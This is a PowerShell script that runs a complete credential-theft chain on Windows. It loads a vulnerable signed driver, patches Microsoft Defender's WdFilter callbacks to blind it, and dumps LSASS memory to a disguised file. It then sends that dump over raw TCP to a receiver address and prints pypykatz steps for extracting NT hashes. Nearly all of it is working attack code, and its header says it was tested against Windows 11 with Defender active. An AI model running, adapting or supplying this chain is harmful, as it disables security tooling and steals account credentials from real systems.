# run_chain.ps1 - Full BYOVD LSASS credential theft chain (DumpRpm path)
#
# Chain:
#   1. Load BiosToolCommonDriver.sys via NtLoadDriver
#   2. Patch WdFilter ObCallbacks (Process + Thread callback list head)
#   3. DumpRpm: ReadProcessMemory over all LSASS VA regions -> svch_heap.bin
#   4. TCP exfil to receiver
#   5. (Offline) rpm2minidump.py + pypykatz to extract NT hashes
#
# Requirements:
#   - Administrator + SeLoadDriverPrivilege
#   - cascade.exe and BiosToolCommonDriver.sys in $ToolsDir
#   - Receiver listening on $ReceiverIP:$ReceiverPort before running this script
#
# Tested on: Windows 11 22H2 (build 22621) with WdFilter / Defender active
#
param(
    [string]$ToolsDir    = $env:PUBLIC,
    [string]$ReceiverIP  = '192.0.2.254',
    [int]$ReceiverPort   = 9999,
    [string]$DumpFile    = 'C:\Users\Public\svch_heap.bin',
    [string]$DriverPath  = '',   # defaults to $ToolsDir\BiosToolCommonDriver.sys
    [string]$CascadePath = ''    # defaults to $ToolsDir\cascade.exe
)

$ErrorActionPreference = 'Stop'
$log = "$ToolsDir\cascade_chain.log"

function Log($msg) {
    $ts = Get-Date -Format 'HH:mm:ss'
    $line = "[$ts] $msg"
    Write-Host $line
    $line | Out-File $log -Append
}

"[*] BYOVD chain started $(Get-Date)" | Out-File $log

if (-not $DriverPath)  { $DriverPath  = "$ToolsDir\BiosToolCommonDriver.sys" }
if (-not $CascadePath) { $CascadePath = "$ToolsDir\cascade.exe" }

# -- Verify prerequisites --
foreach ($f in @($DriverPath, $CascadePath)) {
    if (-not (Test-Path $f)) {
        Log "[-] Missing: $f"
        exit 1
    }
}

# -- Phase 1: Patch ObCallbacks --
Log "[*] Phase 1: Patching WdFilter ObCallbacks"
$p1 = Start-Process -FilePath $CascadePath `
    -ArgumentList "--driver `"$DriverPath`" --patch-callbacks --no-xor" `
    -Wait -PassThru -RedirectStandardOutput "$ToolsDir\phase1_out.txt" `
    -RedirectStandardError  "$ToolsDir\phase1_err.txt"
Get-Content "$ToolsDir\phase1_out.txt" | ForEach-Object { Log $_ }
Get-Content "$ToolsDir\phase1_err.txt" | ForEach-Object { Log $_ }
if ($p1.ExitCode -ne 0) {
    Log "[-] Phase 1 failed (exit $($p1.ExitCode))"
    exit 1
}
Log "[+] Phase 1 complete"

# -- Phase 2: DumpRpm --
Log "[*] Phase 2: DumpRpm (ReadProcessMemory over LSASS VA regions)"
Remove-Item $DumpFile -Force -ErrorAction SilentlyContinue
$p2 = Start-Process -FilePath $CascadePath `
    -ArgumentList "--driver `"$DriverPath`" --dump-rpm --out `"$DumpFile`" --no-xor" `
    -Wait -PassThru -RedirectStandardOutput "$ToolsDir\phase2_out.txt" `
    -RedirectStandardError  "$ToolsDir\phase2_err.txt"
Get-Content "$ToolsDir\phase2_out.txt" | ForEach-Object { Log $_ }
Get-Content "$ToolsDir\phase2_err.txt" | ForEach-Object { Log $_ }
if ($p2.ExitCode -ne 0) {
    Log "[-] Phase 2 failed (exit $($p2.ExitCode))"
    exit 1
}
$sz = (Get-Item $DumpFile -ErrorAction SilentlyContinue).Length
Log "[+] DumpRpm complete: $DumpFile ($sz bytes, $([math]::Round($sz/1MB,1)) MB)"

# -- Phase 3: TCP Exfil --
Log "[*] Phase 3: Exfil -> ${ReceiverIP}:${ReceiverPort}"
try {
    $data   = [System.IO.File]::ReadAllBytes($DumpFile)
    $tcp    = New-Object System.Net.Sockets.TcpClient($ReceiverIP, $ReceiverPort)
    $stream = $tcp.GetStream()
    $stream.Write($data, 0, $data.Length)
    $stream.Flush()
    $tcp.Close()
    Log "[+] Exfil complete: $($data.Length) bytes sent"
} catch {
    Log "[-] Exfil failed: $_"
    exit 1
}

Log "[+] Chain complete. Next steps on analyst box:"
Log "    python3 tools/rpm2minidump.py lsass_raw.bin lsass.dmp"
Log "    pypykatz lsa minidump lsass.dmp"
